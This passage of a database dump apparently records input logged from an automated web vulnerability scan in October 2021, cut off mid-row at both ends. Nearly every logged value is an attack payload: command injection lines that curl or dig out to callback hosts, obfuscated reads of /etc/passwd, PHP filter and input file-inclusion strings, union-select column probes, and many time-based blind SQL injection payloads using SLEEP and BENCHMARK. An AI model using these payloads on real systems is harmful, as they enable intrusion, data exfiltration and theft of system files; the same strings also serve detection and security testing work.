tst2.qq.com/cmd_inject/2eb63fffc7b34903b7cfb675ab404f00\n\'','2021-10-09 12:31:09'),('null','',NULL,'\'%0acurl tst2.qq.com/cmd_inject/2eb63fffc7b34903b7cfb675ab404f00%0a\'','2021-10-09 12:31:09'),('null','',NULL,'\'\ncurl tst2.qq.com/cmd_inject/2eb63fffc7b34903b7cfb675ab404f00\n\'','2021-10-09 12:31:09'),('null','',NULL,'\'`cat /etc/passwd TST99861953be510442ffaef279d0c7f707`\'','2021-10-09 12:31:11'),('null','',NULL,'\'`cat /etc/passwd TST99861953be510442ffaef279d0c7f707`\'','2021-10-09 12:31:11'),('null','',NULL,'\'`cat /etc/passwd TST99861953be510442ffaef279d0c7f707`\'','2021-10-09 12:31:12'),('null','',NULL,'\'`cat /etc/passwd TST99861953be510442ffaef279d0c7f707`\'','2021-10-09 12:31:12'),('null','',NULL,'\'|cat /etc/passwd TSTb2e35db6c05fa3cf24592ddc351033d7|\'','2021-10-09 12:31:13'),('null','',NULL,'\'|cat /etc/passwd TSTb2e35db6c05fa3cf24592ddc351033d7|\'','2021-10-09 12:31:14'),('null','',NULL,'\'|cat /etc/passwd TSTb2e35db6c05fa3cf24592ddc351033d7|\'','2021-10-09 12:31:14'),('null','',NULL,'\'|cat /etc/passwd TSTb2e35db6c05fa3cf24592ddc351033d7|\'','2021-10-09 12:31:14'),('null','',NULL,'\';cat /etc/passwd TST845e279df85d1795299ab60ffefcdeaf;\'','2021-10-09 12:31:16'),('null','',NULL,'\';cat /etc/passwd TST845e279df85d1795299ab60ffefcdeaf;\'','2021-10-09 12:31:16'),('null','',NULL,'\';cat /etc/passwd TST845e279df85d1795299ab60ffefcdeaf;\'','2021-10-09 12:31:16'),('null','',NULL,'\';cat /etc/passwd TST845e279df85d1795299ab60ffefcdeaf;\'','2021-10-09 12:31:17'),('null','',NULL,'\'&cat /etc/passwd TST75c85b8d558845797e3c382aa0f5c897&\'','2021-10-09 12:31:18'),('null','',NULL,'\'&cat /etc/passwd TST75c85b8d558845797e3c382aa0f5c897&\'','2021-10-09 12:31:18'),('null','',NULL,'\'&cat /etc/passwd TST75c85b8d558845797e3c382aa0f5c897&\'','2021-10-09 12:31:19'),('null','',NULL,'\'&cat /etc/passwd TST75c85b8d558845797e3c382aa0f5c897&\'','2021-10-09 12:31:19'),('null','',NULL,'%0acat /etc/passwd TSTb442ab947701ec65ecfa39d068488515%0a','2021-10-09 12:31:21'),('null','',NULL,'\ncat /etc/passwd TSTb442ab947701ec65ecfa39d068488515\n','2021-10-09 12:31:21'),('null','',NULL,'%0acat /etc/passwd TSTb442ab947701ec65ecfa39d068488515%0a','2021-10-09 12:31:21'),('null','',NULL,'\ncat /etc/passwd TSTb442ab947701ec65ecfa39d068488515\n','2021-10-09 12:31:21'),('null','',NULL,'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST9881565c3497cf50196081c1a7768a39)','2021-10-09 12:31:23'),('null','',NULL,'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST9881565c3497cf50196081c1a7768a39)','2021-10-09 12:31:23'),('null','',NULL,'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST9881565c3497cf50196081c1a7768a39)','2021-10-09 12:31:24'),('null','',NULL,'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST9881565c3497cf50196081c1a7768a39)','2021-10-09 12:31:24'),('null','',NULL,'$(cat$IFS/etc/passwd$IFS/TST5b60b8ffd07a4d4dc3030e16f457bc90)','2021-10-09 12:31:25'),('null','',NULL,'$(cat$IFS/etc/passwd$IFS/TST5b60b8ffd07a4d4dc3030e16f457bc90)','2021-10-09 12:31:26'),('null','',NULL,'$(cat$IFS/etc/passwd$IFS/TST5b60b8ffd07a4d4dc3030e16f457bc90)','2021-10-09 12:31:26'),('null','',NULL,'$(cat$IFS/etc/passwd$IFS/TST5b60b8ffd07a4d4dc3030e16f457bc90)','2021-10-09 12:31:26'),('null','',NULL,'$(cat /etc/passwd TST200afc778fe605b090e1d388a6f93c1b)','2021-10-09 12:31:28'),('null','',NULL,'$(cat /etc/passwd TST200afc778fe605b090e1d388a6f93c1b)','2021-10-09 12:31:28'),('null','',NULL,'$(cat /etc/passwd TST200afc778fe605b090e1d388a6f93c1b)','2021-10-09 12:31:28'),('null','',NULL,'$(cat /etc/passwd TST200afc778fe605b090e1d388a6f93c1b)','2021-10-09 12:31:29'),('null','',NULL,'`cat /etc/passwd TSTd6f308bcc36ee3b15e4ada0570944e52`','2021-10-09 12:31:30'),('null','',NULL,'`cat /etc/passwd TSTd6f308bcc36ee3b15e4ada0570944e52`','2021-10-09 12:31:30'),('null','',NULL,'`cat /etc/passwd TSTd6f308bcc36ee3b15e4ada0570944e52`','2021-10-09 12:31:31'),('null','',NULL,'`cat /etc/passwd TSTd6f308bcc36ee3b15e4ada0570944e52`','2021-10-09 12:31:31'),('null','',NULL,'|cat /etc/passwd TST57f91fcb7f9aa3a532b6ca7c0f7525ed|','2021-10-09 12:31:33'),('null','',NULL,'|cat /etc/passwd TST57f91fcb7f9aa3a532b6ca7c0f7525ed|','2021-10-09 12:31:33'),('null','',NULL,'|cat /etc/passwd TST57f91fcb7f9aa3a532b6ca7c0f7525ed|','2021-10-09 12:31:33'),('null','',NULL,'|cat /etc/passwd TST57f91fcb7f9aa3a532b6ca7c0f7525ed|','2021-10-09 12:31:33'),('null','',NULL,'\'$(cat$IFS/etc/passwd$IFS/TST8275a0fb150ede8302a55139772674b4)\'','2021-10-09 12:31:35'),('null','',NULL,'\'$(cat$IFS/etc/passwd$IFS/TST8275a0fb150ede8302a55139772674b4)\'','2021-10-09 12:31:35'),('null','',NULL,'\'$(cat$IFS/etc/passwd$IFS/TST8275a0fb150ede8302a55139772674b4)\'','2021-10-09 12:31:36'),('null','',NULL,'\'$(cat$IFS/etc/passwd$IFS/TST8275a0fb150ede8302a55139772674b4)\'','2021-10-09 12:31:36'),('null','',NULL,';cat /etc/passwd TST04148160c735f79615330268352ff2f4;','2021-10-09 12:31:37'),('null','',NULL,';cat /etc/passwd TST04148160c735f79615330268352ff2f4;','2021-10-09 12:31:38'),('null','',NULL,';cat /etc/passwd TST04148160c735f79615330268352ff2f4;','2021-10-09 12:31:38'),('null','',NULL,';cat /etc/passwd TST04148160c735f79615330268352ff2f4;','2021-10-09 12:31:38'),('null','',NULL,'&cat /etc/passwd TST8c4e01ddd9077eeddc6ca17729d28b8a&','2021-10-09 12:31:40'),('null','',NULL,'&cat /etc/passwd TST8c4e01ddd9077eeddc6ca17729d28b8a&','2021-10-09 12:31:40'),('null','',NULL,'&cat /etc/passwd TST8c4e01ddd9077eeddc6ca17729d28b8a&','2021-10-09 12:31:40'),('null','',NULL,'&cat /etc/passwd TST8c4e01ddd9077eeddc6ca17729d28b8a&','2021-10-09 12:31:41'),('null','',NULL,'http://sectest.wsd.com/T_S_T_8fe9785c5d8edffb797b9851c9e9b1dd','2021-10-09 12:31:42'),('null','',NULL,'|dig @119.29.29.29 @8.8.8.8 +trace TSTafbfb1dfe2c01c98b662aaf848faab20.cmd.mauu.mauu.me|','2021-10-09 12:31:43'),('null','',NULL,'\'|dig @119.29.29.29 @8.8.8.8 +trace TSTb101531dd19df4cfc83db0b844b82d20.cmd.mauu.mauu.me #','2021-10-09 12:31:43'),('null','',NULL,'\"|dig @119.29.29.29 @8.8.8.8 +trace TSTf12937bdfcbc94fe77d9a64d8f7909ab.cmd.mauu.mauu.me #','2021-10-09 12:31:44'),('null','',NULL,'./index.php','2021-10-09 12:31:44'),('null','',NULL,'php://filter/read=convert.base64-encode/resource=/etc/passwd','2021-10-09 12:31:45'),('null','',NULL,'php://input','2021-10-09 12:31:45'),('null','',NULL,'php://filter/read=convert.base64-encode/resource=/etc/passwd\0','2021-10-09 12:31:47'),('null','',NULL,'php://input','2021-10-09 12:31:47'),('null','',NULL,'php://filter/read=convert.base64-encode/resource=/etc/passwd','2021-10-09 12:31:48'),('null','',NULL,'./index.php%00.jpg','2021-10-09 12:31:48'),('null','',NULL,'./index.php\0.jpg','2021-10-09 12:31:49'),('null','',NULL,'./index.php','2021-10-09 12:31:49'),('null','',NULL,'php://filter/read=convert.base64-encode/resource=/etc/passwd%00','2021-10-09 12:31:49'),('null','',NULL,'-T_S_T_555fe76149574381277f42cb2a3ba8b3%2F%2A%27T_S_T%27%22T_S_T%22%2A%2F','2021-10-09 12:31:50'),('null','',NULL,'-T_S_T_555fe76149574381277f42cb2a3ba8b3/*\'T_S_T\'\"T_S_T\"*/','2021-10-09 12:31:51'),('null','',NULL,'\' union select 1-- ','2021-10-09 12:31:52'),('null','',NULL,'\' union select 1,2-- ','2021-10-09 12:31:52'),('null','',NULL,'\' union select 1,2,3-- ','2021-10-09 12:31:52'),('null','',NULL,'\' union select 1,2,3,4-- ','2021-10-09 12:31:52'),('null','',NULL,'\' union select 1,2,3,4,5-- ','2021-10-09 12:31:52'),('null','',NULL,'\' union select 1-- ','2021-10-09 12:31:56'),('null','',NULL,'\' union select 1,2-- ','2021-10-09 12:31:56'),('null','',NULL,'\' union select 1,2,3-- ','2021-10-09 12:31:56'),('null','',NULL,'\' union select 1,2,3,4-- ','2021-10-09 12:31:56'),('null','',NULL,'','2021-10-09 12:31:56'),('null','',NULL,'\' union select 1,2,3,4,5,6-- ','2021-10-09 12:31:57'),('null','',NULL,'\' union select 1,2,3,4,5,6,7-- ','2021-10-09 12:31:57'),('null','',NULL,'\' union select 1,2,3,4,5,6,7,8-- ','2021-10-09 12:31:57'),('null','',NULL,'\' union select 1,2,3,4,5,6,7,8,9-- ','2021-10-09 12:31:58'),('null','',NULL,'\' union select 1,2,3,4,5,6,7,8,9,10-- ','2021-10-09 12:31:58'),('null','',NULL,'\' union select 1,2,3,4,5-- ','2021-10-09 12:32:01'),('null','',NULL,'\' union select 1,2,3,4,5,6-- ','2021-10-09 12:32:01'),('null','',NULL,'\' union select 1,2,3,4,5,6,7-- ','2021-10-09 12:32:01'),('null','',NULL,'\' union select 1,2,3,4,5,6,7,8-- ','2021-10-09 12:32:01'),('null','',NULL,'\' union select 1,2,3,4,5,6,7,8,9-- ','2021-10-09 12:32:01'),('null','',NULL,'','2021-10-09 12:32:02'),('null','',NULL,'','2021-10-09 12:32:03'),('null','',NULL,'','2021-10-09 12:32:03'),('null','',NULL,'','2021-10-09 12:32:04'),('null','',NULL,'','2021-10-09 12:32:05'),('null','',NULL,'','2021-10-09 12:32:06'),('null','',NULL,'\' union select 1,2,3,4,5,6,7,8,9,10-- ','2021-10-09 12:32:06'),('null','',NULL,'','2021-10-09 12:32:06'),('null','',NULL,'','2021-10-09 12:32:07'),('null','',NULL,'','2021-10-09 12:32:07'),('null','',NULL,'','2021-10-09 12:32:07'),('null','',NULL,'','2021-10-09 12:32:08'),('null','',NULL,'xbf\'xbf\"','2021-10-09 12:32:08'),('null','',NULL,'','2021-10-09 12:32:08'),('null','',NULL,'xbf%27xbf%22','2021-10-09 12:32:09'),('null','',NULL,'','2021-10-09 12:32:09'),('null','',NULL,'xbf\'xbf\"','2021-10-09 12:32:09'),('null','',NULL,'','2021-10-09 12:32:09'),('null','',NULL,'xbf\'xbf\"','2021-10-09 12:32:09'),('null','',NULL,'','2021-10-09 12:32:09'),('null','',NULL,'xbf%27xbf%22','2021-10-09 12:32:10'),('null','',NULL,'','2021-10-09 12:32:10'),('null','',NULL,'xbf\'xbf\"','2021-10-09 12:32:10'),('null','',NULL,'','2021-10-09 12:32:10'),('null','',NULL,'','2021-10-09 12:32:11'),('null','',NULL,'JyI=','2021-10-09 12:32:11'),('null','',NULL,'','2021-10-09 12:32:11'),('null','',NULL,'','2021-10-09 12:32:11'),('null','',NULL,'','2021-10-09 12:32:12'),('null','',NULL,'','2021-10-09 12:32:12'),('null','',NULL,'JyI=','2021-10-09 12:32:13'),('null','',NULL,'','2021-10-09 12:32:13'),('null','',NULL,'','2021-10-09 12:32:13'),('null','',NULL,'(select convert(int,CHAR(65)))','2021-10-09 12:32:13'),('null','',NULL,'','2021-10-09 12:32:13'),('null','',NULL,'','2021-10-09 12:32:14'),('null','',NULL,'','2021-10-09 12:32:14'),('null','',NULL,'','2021-10-09 12:32:15'),('null','',NULL,'(select convert(int,CHAR(65)))','2021-10-09 12:32:15'),('null','',NULL,'','2021-10-09 12:32:15'),('null','',NULL,'','2021-10-09 12:32:15'),('null','',NULL,'','2021-10-09 12:32:16'),('null','',NULL,'','2021-10-09 12:32:16'),('null','',NULL,'','2021-10-09 12:32:17'),('null','',NULL,'','2021-10-09 12:32:17'),('null','',NULL,'','2021-10-09 12:32:17'),('null','',NULL,'','2021-10-09 12:32:18'),('null','',NULL,'','2021-10-09 12:32:18'),('null','',NULL,'','2021-10-09 12:32:19'),('null','',NULL,'','2021-10-09 12:32:19'),('null','',NULL,'','2021-10-09 12:32:19'),('null','',NULL,'','2021-10-09 12:32:20'),('null','',NULL,'','2021-10-09 12:32:20'),('null','',NULL,'%25bf%2527%25bf%27%2527%2522%27%22%5C%255C%250d%250a%2523%23','2021-10-09 12:32:21'),('null','',NULL,'','2021-10-09 12:32:21'),('null','',NULL,'%bf%27%bf\'%27%22\'\"\\%5C%0d%0a%23#','2021-10-09 12:32:21'),('null','',NULL,'','2021-10-09 12:32:21'),('null','',NULL,'','2021-10-09 12:32:21'),('null','',NULL,'%25bf%2527%25bf%27%2527%2522%27%22%5C%255C%250d%250a%2523%23','2021-10-09 12:32:22'),('null','',NULL,'','2021-10-09 12:32:22'),('null','',NULL,'%bf%27%bf\'%27%22\'\"\\%5C%0d%0a%23#','2021-10-09 12:32:22'),('null','',NULL,'','2021-10-09 12:32:22'),('null','',NULL,'sleep(4)','2021-10-09 12:32:23'),('null','',NULL,'','2021-10-09 12:32:23'),('null','',NULL,'','2021-10-09 12:32:24'),('null','',NULL,'','2021-10-09 12:32:24'),('null','',NULL,'','2021-10-09 12:32:24'),('null','',NULL,'','2021-10-09 12:32:25'),('null','',NULL,'','2021-10-09 12:32:25'),('null','',NULL,' union select 1-- ','2021-10-09 12:32:26'),('null','',NULL,' union select 1,2-- ','2021-10-09 12:32:26'),('null','',NULL,' union select 1,2,3-- ','2021-10-09 12:32:26'),('null','',NULL,' union select 1,2,3,4-- ','2021-10-09 12:32:26'),('null','',NULL,' union select 1,2,3,4,5-- ','2021-10-09 12:32:26'),('null','',NULL,' union select 1-- ','2021-10-09 12:32:27'),('null','',NULL,' union select 1,2-- ','2021-10-09 12:32:27'),('null','',NULL,' union select 1,2,3-- ','2021-10-09 12:32:27'),('null','',NULL,' union select 1,2,3,4-- ','2021-10-09 12:32:27'),('null','',NULL,' union select 1,2,3,4,5-- ','2021-10-09 12:32:27'),('null','',NULL,'','2021-10-09 12:32:28'),('null','',NULL,'','2021-10-09 12:32:28'),('null','',NULL,'','2021-10-09 12:32:28'),('null','',NULL,'','2021-10-09 12:32:28'),('null','',NULL,'','2021-10-09 12:32:28'),('null','',NULL,'','2021-10-09 12:32:29'),('null','',NULL,'','2021-10-09 12:32:29'),('null','',NULL,'','2021-10-09 12:32:29'),('null','',NULL,'','2021-10-09 12:32:29'),('null','',NULL,'','2021-10-09 12:32:29'),('null','',NULL,'','2021-10-09 12:32:30'),('null','',NULL,'','2021-10-09 12:32:30'),('null','',NULL,'select sleep(3)','2021-10-09 12:32:30'),('null','',NULL,' union select 1,2,3,4,5,6-- ','2021-10-09 12:32:31'),('null','',NULL,' union select 1,2,3,4,5,6,7-- ','2021-10-09 12:32:31'),('null','',NULL,' union select 1,2,3,4,5,6,7,8-- ','2021-10-09 12:32:31'),('null','',NULL,' union select 1,2,3,4,5,6,7,8,9-- ','2021-10-09 12:32:31'),('null','',NULL,'\" union select 1-- ','2021-10-09 12:32:32'),('null','',NULL,'\" union select 1,2-- ','2021-10-09 12:32:32'),('null','',NULL,' union select 1,2,3,4,5,6-- ','2021-10-09 12:32:32'),('null','',NULL,'\" union select 1,2,3-- ','2021-10-09 12:32:32'),('null','',NULL,' union select 1,2,3,4,5,6,7-- ','2021-10-09 12:32:32'),('null','',NULL,' union select 1,2,3,4,5,6,7,8,9,10-- ','2021-10-09 12:32:36'),('null','',NULL,'\" union select 1-- ','2021-10-09 12:32:36'),('null','',NULL,'\" union select 1,2-- ','2021-10-09 12:32:36'),('null','',NULL,'\" union select 1,2,3-- ','2021-10-09 12:32:37'),('null','',NULL,'\" union select 1,2,3,4-- ','2021-10-09 12:32:37'),('null','',NULL,'\" union select 1,2,3,4,5-- ','2021-10-09 12:32:37'),('null','',NULL,'\" union select 1,2,3,4-- ','2021-10-09 12:32:37'),('null','',NULL,'\" union select 1,2,3,4,5-- ','2021-10-09 12:32:37'),('null','',NULL,'\'||(SELECT \'vibv\' FROM DUAL WHERE 8210=8210 AND (SELECT*FROM(SELECT(SLEEP(2)))vibv))||\'','2021-10-09 12:32:40'),('null','',NULL,'\'||(SELECT \'bjue\' FROM DUAL WHERE 510=510 AND (SELECT*FROM(SELECT(SLEEP(3)))bjue))||\'','2021-10-09 12:32:41'),('null','',NULL,'\" union select 1,2,3,4,5,6-- ','2021-10-09 12:32:42'),('null','',NULL,'\" union select 1,2,3,4,5,6,7-- ','2021-10-09 12:32:42'),('null','',NULL,'\" union select 1,2,3,4,5,6,7,8-- ','2021-10-09 12:32:42'),('null','',NULL,'\" union select 1,2,3,4,5,6,7,8,9-- ','2021-10-09 12:32:42'),('null','',NULL,'\'||(SELECT \'vent\' WHERE 8410=8410 AND (SELECT*FROM(SELECT(SLEEP(3)))vent))||\'','2021-10-09 12:32:43'),('null','',NULL,'\'||(SELECT \'wkeu\' WHERE 8810=8810 AND (SELECT*FROM(SELECT(SLEEP(2)))wkeu))||\'','2021-10-09 12:32:44'),('null','',NULL,'\'+(SELECT ehlk WHERE 1910=1910 AND (SELECT*FROM(SELECT(SLEEP(3)))ehlk))+\'','2021-10-09 12:32:45'),('null','',NULL,'\'+(SELECT mxel WHERE 5010=5010 AND (SELECT*FROM(SELECT(SLEEP(4)))mxel))+\'','2021-10-09 12:32:46'),('null','',NULL,'\'+(SELECT \'vcej\' WHERE 8310=8310 AND (SELECT*FROM(SELECT(SLEEP(3)))vcej))+\'','2021-10-09 12:32:46'),('null','',NULL,'\" union select 1,2,3,4,5,6,7,8,9,10-- ','2021-10-09 12:32:47'),('null','',NULL,' union select 1,2,3,4,5,6,7,8-- ','2021-10-09 12:32:47'),('null','',NULL,' union select 1,2,3,4,5,6,7,8,9-- ','2021-10-09 12:32:47'),('null','',NULL,'\" union select 1,2,3,4,5,6-- ','2021-10-09 12:32:47'),('null','',NULL,' union select 1,2,3,4,5,6,7,8,9,10-- ','2021-10-09 12:32:47'),('null','',NULL,'\'+(SELECT \'clga\' WHERE 810=810 AND (SELECT*FROM(SELECT(SLEEP(4)))clga))+\'','2021-10-09 12:32:48'),('null','',NULL,'\' IN BOOLEAN MODE) AND (SELECT*FROM(SELECT(SLEEP(3)))tohv) limit 1#','2021-10-09 12:32:48'),('null','',NULL,'\' IN BOOLEAN MODE) AND (SELECT*FROM(SELECT(SLEEP(3)))huxl) limit 1#','2021-10-09 12:32:49'),('null','',NULL,' OR (SELECT*FROM(SELECT(SLEEP(3)))ottj)','2021-10-09 12:32:49'),('null','',NULL,' OR (SELECT*FROM(SELECT(SLEEP(3)))bzep)','2021-10-09 12:32:50'),('null','',NULL,'\"+(SELECT*FROM(SELECT(SLEEP(2)))ofkm)+\"','2021-10-09 12:32:50'),('null','',NULL,'\"+(SELECT*FROM(SELECT(SLEEP(4)))cgsp)+\"','2021-10-09 12:32:51'),('null','',NULL,'\'+(SELECT*FROM(SELECT(SLEEP(4)))zvao)+\'','2021-10-09 12:32:51'),('null','',NULL,'\'+(SELECT*FROM(SELECT(SLEEP(3)))csdh)+\'','2021-10-09 12:32:52'),('null','',NULL,'\" union select 1,2,3,4,5,6,7-- ','2021-10-09 12:32:52'),('null','',NULL,'\" union select 1,2,3,4,5,6,7,8-- ','2021-10-09 12:32:52'),('null','',NULL,'\" union select 1,2,3,4,5,6,7,8,9-- ','2021-10-09 12:32:52'),('null','',NULL,'-(SELECT*FROM(SELECT(SLEEP(3)))cgws)','2021-10-09 12:32:53'),('null','',NULL,'-(SELECT*FROM(SELECT(SLEEP(2)))zhkp)','2021-10-09 12:32:53'),('null','',NULL,'-/*!(SELECT*FROM(SELECT(SLEEP(3)))pysa)*/','2021-10-09 12:32:53'),('null','',NULL,'-/*!(SELECT*FROM(SELECT(SLEEP(2)))latk)*/','2021-10-09 12:32:53'),('null','',NULL,'MAKE_SET(\"rdrz\"=\"rdrz\",(SELECT*FROM(SELECT(SLEEP(4)))rdrz))\"','2021-10-09 12:32:54'),('null','',NULL,'MAKE_SET(\"vlgw\"=\"vlgw\",(SELECT*FROM(SELECT(SLEEP(3)))vlgw))\"','2021-10-09 12:32:55'),('null','',NULL,'/*!30000-(SELECT*FROM(SELECT(SLEEP(2)))trgy)*/','2021-10-09 12:32:55'),('null','',NULL,'/*!30000-(SELECT*FROM(SELECT(SLEEP(2)))tigk)*/','2021-10-09 12:32:55'),('null','',NULL,'\"/**/Or/**/if(now()=sysdate(),sleep(4),0) limit 1#','2021-10-09 12:32:57'),('null','',NULL,'\" union select 1,2,3,4,5,6,7,8,9,10-- ','2021-10-09 12:32:57'),('null','',NULL,'\"/**/Or/**/if(now()=sysdate(),sleep(4),0) limit 1#','2021-10-09 12:32:58'),('null','',NULL,'\'/**/Or/**/if(now()=sysdate(),sleep(3),0) limit 1#','2021-10-09 12:32:58'),('null','',NULL,'\'/**/Or/**/if(now()=sysdate(),sleep(2),0) limit 1#','2021-10-09 12:32:59'),('null','',NULL,'/**/Or/**/if(now()=sysdate(),sleep(3),0)','2021-10-09 12:32:59'),('null','',NULL,'/**/Or/**/if(now()=sysdate(),sleep(3),0)','2021-10-09 12:32:59'),('null','',NULL,' or if(now()=sysdate(),sleep(4),0)','2021-10-09 12:32:59'),('null','',NULL,' or if(now()=sysdate(),sleep(3),0)','2021-10-09 12:33:00'),('null','',NULL,' or if(now()=sysdate(),sleep(3),0) limit 1#','2021-10-09 12:33:00'),('null','',NULL,' or if(now()=sysdate(),sleep(3),0) limit 1#','2021-10-09 12:33:00'),('null','',NULL,'\'/**/And/**/if(now()=sysdate(),sleep(4),0) limit 1#','2021-10-09 12:33:00'),('null','',NULL,'\'/**/And/**/if(now()=sysdate(),sleep(4),0) limit 1#','2021-10-09 12:33:01'),('null','',NULL,'/**/And/**/if(now()=sysdate(),sleep(4),0)','2021-10-09 12:33:03'),('null','',NULL,'/**/And/**/if(now()=sysdate(),sleep(2),0)','2021-10-09 12:33:03'),('null','',NULL,'\"/**/And/**/if(now()=sysdate(),sleep(4),0) limit 1#','2021-10-09 12:33:03'),('null','',NULL,'\"/**/And/**/if(now()=sysdate(),sleep(2),0) limit 1#','2021-10-09 12:33:04'),('null','',NULL,' and if(now()=sysdate(),sleep(3),0) limit 1#','2021-10-09 12:33:04'),('null','',NULL,' and if(now()=sysdate(),sleep(4),0) limit 1#','2021-10-09 12:33:05'),('null','',NULL,' and if(now()=sysdate(),sleep(3),0)','2021-10-09 12:33:06'),('null','',NULL,' and if(now()=sysdate(),sleep(3),0)','2021-10-09 12:33:06'),('null','',NULL,'if(now()=sysdate(),sleep(3),0)/*\'xor(if(now()=sysdate(),sleep(3),0))or\'\"xor(if(now()=sysdate(),sleep(3),0))or\"*/','2021-10-09 12:33:07'),('null','',NULL,'if(now()=sysdate(),sleep(2),0)/*\'xor(if(now()=sysdate(),sleep(2),0))or\'\"xor(if(now()=sysdate(),sleep(2),0))or\"*/','2021-10-09 12:33:08'),('null','',NULL,'-if(now()=sysdate(),sleep(3),0)','2021-10-09 12:33:08'),('null','',NULL,'-if(now()=sysdate(),sleep(4),0)','2021-10-09 12:33:09'),('null','',NULL,'-if(now()=sysdate(),sleep(3),0)/*\'XOR(if(now()=sysdate(),sleep(3),0))OR\'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/','2021-10-09 12:33:09'),('null','',NULL,'-if%28now%28%29%3Dsysdate%28%29%2Csleep%283%29%2C0%29%2F%2A%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%283%29%2C0%29%29OR%27%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%283%29%2C0%29%29OR%22%2A%2F','2021-10-09 12:33:10'),('null','',NULL,'-if(now()=sysdate(),sleep(3),0)/*\'XOR(if(now()=sysdate(),sleep(3),0))OR\'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/','2021-10-09 12:33:10'),('null','',NULL,'-if%28now%28%29%3Dsysdate%28%29%2Csleep%283%29%2C0%29%2F%2A%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%283%29%2C0%29%29OR%27%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%283%29%2C0%29%29OR%22%2A%2F','2021-10-09 12:33:10'),('null','',NULL,',(SELECT (CASE WHEN (9010=9010) THEN (SELECT BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))) ELSE 9010*(SELECT 9010 FROM mysql.db) END))','2021-10-09 12:33:11'),('null','',NULL,',(SELECT (CASE WHEN (6510=6510) THEN (SELECT BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))) ELSE 6510*(SELECT 6510 FROM mysql.db) END))','2021-10-09 12:33:12'),('null','',NULL,',(SELECT (CASE WHEN (7110=7110) THEN SLEEP(3) ELSE 7110 END))','2021-10-09 12:33:12'),('null','',NULL,',(SELECT (CASE WHEN (5610=5610) THEN SLEEP(4) ELSE 5610 END))','2021-10-09 12:33:13'),('null','',NULL,'MAKE_SET(7110=7110,(SELECT*FROM(SELECT(SLEEP(3)))smss))','2021-10-09 12:33:13'),('null','',NULL,'MAKE_SET(2910=2910,(SELECT*FROM(SELECT(SLEEP(3)))hdra))','2021-10-09 12:33:13'),('null','',NULL,'(1210=1210 AND (SELECT*FROM(SELECT(SLEEP(3)))cjmu))','2021-10-09 12:33:13'),('null','',NULL,'(8410=8410 AND (SELECT*FROM(SELECT(SLEEP(3)))vgtc))','2021-10-09 12:33:14'),('null','',NULL,'ELT(9810=9810,(SELECT*FROM(SELECT(SLEEP(4)))zpfy))','2021-10-09 12:33:14'),('null','',NULL,'ELT(1310=1310,(SELECT*FROM(SELECT(SLEEP(3)))dghr))','2021-10-09 12:33:14'),('null','',NULL,'(CASE WHEN (8110=8110) THEN (SELECT*FROM(SELECT(SLEEP(4)))vnkr) ELSE 8110 END)','2021-10-09 12:33:14'),('null','',NULL,'(CASE WHEN (5810=5810) THEN (SELECT*FROM(SELECT(SLEEP(2)))oqff) ELSE 5810 END)','2021-10-09 12:33:15'),('null','',NULL,'(SELECT * FROM (SELECT((SELECT*FROM(SELECT(SLEEP(4)))tuuu)))tuuu)','2021-10-09 12:33:15'),('null','',NULL,'(SELECT * FROM (SELECT((SELECT*FROM(SELECT(SLEEP(3)))fjnh)))fjnh)','2021-10-09 12:33:16'),('null','',NULL,'%28SELECT%20%2A%20FROM%20%28SELECT%28%28SELECT%2AFROM%28SELECT%28SLEEP%283%29%29%29sbsg%29%29%29sbsg%29','2021-10-09 12:33:16'),('null','',NULL,'%28SELECT%20%2A%20FROM%20%28SELECT%28%28SELECT%2AFROM%28SELECT%28SLEEP%282%29%29%29qvvt%29%29%29qvvt%29','2021-10-09 12:33:16'),('null','',NULL,'(CASE WHEN (5710=5710) THEN (SELECT BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))) ELSE 5710)','2021-10-09 12:33:16'),('null','',NULL,'(CASE WHEN (7610=7610) THEN (SELECT BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))) ELSE 7610)','2021-10-09 12:33:16'),('null','',NULL,'\") AS paos WHERE 5910=5910 PROCEDURE ANALYSE(EXTRACTVALUE(5910,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:17'),('null','',NULL,'\") AS tpis WHERE 7510=7510 PROCEDURE ANALYSE(EXTRACTVALUE(7510,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:18'),('null','',NULL,'\') AS stas WHERE 7310=7310 PROCEDURE ANALYSE(EXTRACTVALUE(7310,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:18'),('null','',NULL,'\') AS ynzr WHERE 9610=9610 PROCEDURE ANALYSE(EXTRACTVALUE(9610,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:19'),('null','',NULL,'\")) AS ieyw WHERE 3410=3410 PROCEDURE ANALYSE(EXTRACTVALUE(3410,CONCAT(0x5c,(BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:19'),('null','',NULL,'\")) AS wokg WHERE 8610=8610 PROCEDURE ANALYSE(EXTRACTVALUE(8610,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:20'),('null','',NULL,'\')) AS mmfq WHERE 4910=4910 PROCEDURE ANALYSE(EXTRACTVALUE(4910,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:20'),('null','',NULL,'\')) AS lttz WHERE 4510=4510 PROCEDURE ANALYSE(EXTRACTVALUE(4510,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 